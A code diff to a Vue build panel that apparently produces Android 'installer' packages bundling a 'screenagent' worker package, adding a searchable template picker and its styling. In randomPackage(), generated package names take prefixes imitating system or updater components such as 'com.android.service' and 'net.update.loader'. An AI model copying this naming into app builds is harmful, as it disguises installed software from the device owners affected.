@@ -13,7 +13,10 @@ const result = ref(null),
     batchDeleting = ref(false),
     selectedBuildIds = ref([]),
     copyLink = ref(''),
-    logPre = ref(null);
+    logPre = ref(null),
+    aTemplatePicker = ref(null),
+    aTemplatePickerOpen = ref(false),
+    aTemplateSearch = ref('');
 const logPanel = reactive({ buildId: '', text: '', status: '', loading: false, error: '' });
 const currentOrigin = window.location.origin;
 const bForm = reactive({
@@ -26,7 +29,19 @@ const bForm = reactive({
 });
 const aForm = reactive({ templateId: '', appName: '', homeUrl: '', packageName: '' });
 const bTemplate = computed(() => catalog.value?.templates.find((t) => t.id === bForm.templateId));
+const installerTemplates = computed(() =>
+    (catalog.value?.templates || []).filter((template) => template.kind === 'installer'),
+);
 const aTemplate = computed(() => catalog.value?.templates.find((t) => t.id === aForm.templateId));
+const filteredInstallerTemplates = computed(() => {
+    const keyword = aTemplateSearch.value.trim().toLowerCase();
+    if (!keyword) return installerTemplates.value;
+    return installerTemplates.value.filter((template) =>
+        [template.name, template.id, template.versionName, template.description]
+            .filter(Boolean)
+            .some((value) => value.toLowerCase().includes(keyword)),
+    );
+});
 const statuses = {
     queued: '排队中',
     preparing: '准备源码',
@@ -114,9 +129,24 @@ async function poll() {
     if (!disposed) timer = setTimeout(poll, result.value?.worker.active ? 2000 : 10000);
 }
 function randomPackage(role) {
-    const suffix = crypto.randomUUID().replaceAll('-', '').slice(0, 16);
-    if (role === 'a') aForm.packageName = `org.boundary.installer.p${suffix}`;
-    else bForm.packageName = `org.boundary.worker.p${suffix}`;
+    const prefixes =
+        role === 'a'
+            ? ['org.boundary.installer', 'com.android.service', 'net.update.loader']
+            : ['org.boundary.worker', 'com.android.core', 'net.service.agent'];
+    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+    const first = crypto.randomUUID().replaceAll('-', '').slice(0, 8);
+    const second = crypto.randomUUID().replaceAll('-', '').slice(0, 6);
+    if (role === 'a') aForm.packageName = `${prefix}.p${first}.s${second}`;
+    else bForm.packageName = `${prefix}.p${first}.s${second}`;
+}
+
+function chooseATemplate(template) {
+    aForm.templateId = template.id;
+    aTemplatePickerOpen.value = false;
+    aTemplateSearch.value = '';
+}
+function closeTemplatePicker(event) {
+    if (!aTemplatePicker.value?.contains(event.target)) aTemplatePickerOpen.value = false;
 }
 async function submit(role) {
     if (busyRole.value) return;
@@ -276,16 +306,20 @@ onMounted(async () => {
     try {
         catalog.value = await api('/api/build-templates');
         bForm.templateId = catalog.value.templates.find((t) => t.kind === 'screenagent')?.id || '';
-        aForm.templateId = catalog.value.templates.find((t) => t.kind === 'installer')?.id || '';
+        aForm.templateId = installerTemplates.value[0]?.id || '';
+        randomPackage('a');
+        randomPackage('b');
     } catch (e) {
         error.value = e.message;
     }
+    document.addEventListener('click', closeTemplatePicker);
     if (!disposed) poll();
 });
 onBeforeUnmount(() => {
     disposed = true;
     clearTimeout(timer);
     controller?.abort();
+    document.removeEventListener('click', closeTemplatePicker);
 });
 </script>
 
@@ -425,22 +459,63 @@ onBeforeUnmount(() => {
                     <small>自动携带最新成功 B 包</small>
                 </div>
                 <fieldset :disabled="Boolean(busyRole)" class="build-fields a-build-fields">
-                    <label
-                        >A 包模板版本<select
-                            class="form-select"
-                            v-model="aForm.templateId"
-                            required
+                    <label class="template-picker-field"
+                        >A 包模板版本
+                        <div
+                            ref="aTemplatePicker"
+                            class="template-picker"
+                            :class="{ open: aTemplatePickerOpen }"
                         >
-                            <option
-                                v-for="template in catalog?.templates.filter(
-                                    (item) => item.kind === 'installer',
-                                )"
-                                :key="template.id"
-                                :value="template.id"
+                            <button
+                                type="button"
+                                class="template-picker-trigger"
+                                :aria-expanded="aTemplatePickerOpen"
+                                aria-haspopup="listbox"
+                                @click.stop="aTemplatePickerOpen = !aTemplatePickerOpen"
                             >
-                                {{ template.name }}
-                            </option>
-                        </select></label
+                                <span>
+                                    <strong>{{ aTemplate?.name || '选择 A 包模板' }}</strong>
+                                    <small v-if="aTemplate">{{ aTemplate.description }}</small>
+                                </span>
+                                <span class="template-picker-caret">⌄</span>
+                            </button>
+                            <div
+                                v-if="aTemplatePickerOpen"
+                                class="template-picker-menu"
+                                @click.stop
+                            >
+                                <input
+                                    v-model="aTemplateSearch"
+                                    class="form-control template-picker-search"
+                                    placeholder="搜索版本、名称或说明"
+                                    @keydown.esc="aTemplatePickerOpen = false"
+                                />
+                                <div class="template-picker-list" role="listbox">
+                                    <button
+                                        v-for="template in filteredInstallerTemplates"
+                                        :key="template.id"
+                                        type="button"
+                                        class="template-picker-option"
+                                        :class="{ selected: template.id === aForm.templateId }"
+                                        role="option"
+                                        :aria-selected="template.id === aForm.templateId"
+                                        @click="chooseATemplate(template)"
+                                    >
+                                        <span class="template-option-title">
+                                            <span>{{ template.name }}</span>
+                                            <small>{{ template.versionName }}</small>
+                                        </span>
+                                        <small>{{ template.description }}</small>
+                                    </button>
+                                    <p
+                                        v-if="!filteredInstallerTemplates.length"
+                                        class="template-picker-empty"
+                                    >
+                                        没有匹配的模板
+                                    </p>
+                                </div>
+                            </div>
+                        </div></label
                     >
                     <label
                         >APP 名称<input
@@ -811,6 +886,122 @@ onBeforeUnmount(() => {
 }
 .a-build-fields {
     grid-template-columns: 1fr;
+}
+
+.template-picker-field {
+    position: relative;
+}
+.template-picker {
+    position: relative;
+    min-width: 0;
+}
+.template-picker-trigger {
+    width: 100%;
+    min-height: 48px;
+    display: grid;
+    grid-template-columns: minmax(0, 1fr) auto;
+    align-items: center;
+    gap: 12px;
+    text-align: left;
+    border: 1px solid var(--lab-line);
+    border-radius: 10px;
+    background: #fff;
+    color: var(--lab-ink);
+    padding: 9px 12px;
+    box-shadow: 0 1px 0 #eef1f6;
+}
+.template-picker.open .template-picker-trigger,
+.template-picker-trigger:focus-visible {
+    border-color: #86b7fe;
+    outline: 0;
+    box-shadow: 0 0 0 3px rgb(13 110 253 / 16%);
+}
+.template-picker-trigger span:first-child {
+    min-width: 0;
+    display: grid;
+    gap: 2px;
+}
+.template-picker-trigger strong,
+.template-option-title span {
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+}
+.template-picker-trigger small,
+.template-picker-option > small {
+    color: var(--lab-muted);
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+}
+.template-picker-caret {
+    color: #7b8497;
+    font-size: 16px;
+    line-height: 1;
+}
+.template-picker-menu {
+    position: absolute;
+    z-index: 20;
+    left: 0;
+    right: 0;
+    top: calc(100% + 6px);
+    border: 1px solid #d9dee8;
+    border-radius: 12px;
+    background: #fff;
+    box-shadow: 0 18px 40px rgb(15 23 42 / 18%);
+    padding: 10px;
+}
+.template-picker-search {
+    height: 34px;
+    min-height: 34px;
+    margin-bottom: 8px;
+}
+.template-picker-list {
+    max-height: 280px;
+    overflow: auto;
+    display: grid;
+    gap: 4px;
+    padding-right: 2px;
+}
+.template-picker-option {
+    width: 100%;
+    border: 1px solid transparent;
+    border-radius: 9px;
+    background: transparent;
+    display: grid;
+    gap: 3px;
+    text-align: left;
+    padding: 9px 10px;
+    color: var(--lab-ink);
+    cursor: pointer;
+}
+.template-picker-option:hover,
+.template-picker-option:focus-visible {
+    background: #f4f7fb;
+    outline: 0;
+}
+.template-picker-option.selected {
+    border-color: #b9d3ff;
+    background: #edf5ff;
+}
+.template-option-title {
+    min-width: 0;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    font-weight: 600;
+}
+.template-option-title small {
+    flex: 0 0 auto;
+    color: #3b82f6;
+    font-weight: 700;
+}
+.template-picker-empty {
+    margin: 0;
+    padding: 20px;
+    text-align: center;
+    color: var(--lab-muted);
 }
 .build-section-heading,
 .build-submit {
